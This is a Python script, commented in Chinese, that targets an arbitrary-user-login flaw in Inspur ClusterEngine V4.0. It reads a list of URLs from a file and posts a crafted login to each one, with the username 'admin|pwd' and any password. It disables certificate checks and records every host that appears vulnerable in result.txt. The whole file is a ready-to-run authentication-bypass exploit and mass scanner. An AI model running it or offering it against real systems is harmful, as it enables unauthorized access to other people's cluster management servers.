# /usr/bin/python3
#-*- coding:utf-8 -*-

'''
访问登录页面
USER： admin|pwd
PASS:  任意
'''
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('*-------------------------------------------------------*')
    print('*  \033[36mdescription: 浪潮ClusterEngineV4.0 任意用户登录漏洞                                          \033[0m')
    print('*  \033[36m使用格式:  python3 any-user-login.py                                    \033[0m')
    print('*  \033[36mresponse:{"err":"","exitcode":0,"out":"/\\n"}                                    \033[0m')
    print('*--------------------------------------------------------')


def login(url):
    vulurl = url+"/login"
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    post_data = "op=login&username=admin%7Cpwd&password=123456"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vulurl, headers=header, data=post_data, verify=False, timeout=10)
        if response.status_code == 200 and "0" in response.text:
            print('\033[31m',vulurl + " 存在浪潮ClusterEngineV4.0 任意用户登录漏洞！！！",'\033[0m')
            with open('result.txt','a+') as wp:
                wp.write(url+'\n')
        else:
            print(vulurl + " 不存在浪潮ClusterEngineV4.0 任意用户登录漏洞！！！")
    except:
        print(vulurl + "请求失败！！!")

if __name__ == "__main__":
    title()
    with open('Url.txt','r') as fp:
        for url in fp.readlines():
            login(url.strip())
